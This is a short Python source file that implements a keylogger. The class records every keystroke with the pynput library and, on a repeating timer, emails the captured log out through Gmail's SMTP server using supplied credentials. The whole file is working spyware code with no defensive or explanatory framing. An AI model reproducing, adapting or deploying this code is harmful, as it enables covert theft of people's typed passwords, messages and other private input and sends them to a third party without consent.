import pynput.keyboard
import threading, smtplib

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started..."
        self.interval = time_interval
        self.email = email
        self.password = password

    def appent_to_log(self, string):
        self.log = self.log + string
    def procces_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.appent_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    def start(self):
        keyboardd_listener = pynput.keyboard.Listener(on_press=self.procces_key_press)
        with keyboardd_listener:
            self.report()
            keyboardd_listener.join()

